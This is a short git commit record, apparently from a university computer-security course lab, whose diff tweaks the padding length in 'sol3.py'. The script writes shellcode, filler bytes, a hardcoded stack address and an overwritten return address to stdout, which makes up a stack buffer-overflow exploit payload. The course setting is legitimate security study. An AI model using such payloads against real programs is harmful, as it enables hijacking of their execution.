cc62f42b663010d6641cc17380213b0d6ee9e584
marymx <marymx@umich.edu>
2022-03-28 20:33:34 +0000

    Automatic commit by test script for marymx yaoche

--- sol3.py
+++ sol3.py
@@ -4,4 +4,4 @@ from struct import pack
 
 addr = pack("<I", 0xbffef288)
 main_ret_addr = pack("<I", 0xbffefa9c)
-sys.stdout.buffer.write(shellcode + b"A" * 2001+ addr+main_ret_addr)
+sys.stdout.buffer.write(shellcode + b"A" * 2000+ addr+main_ret_addr)
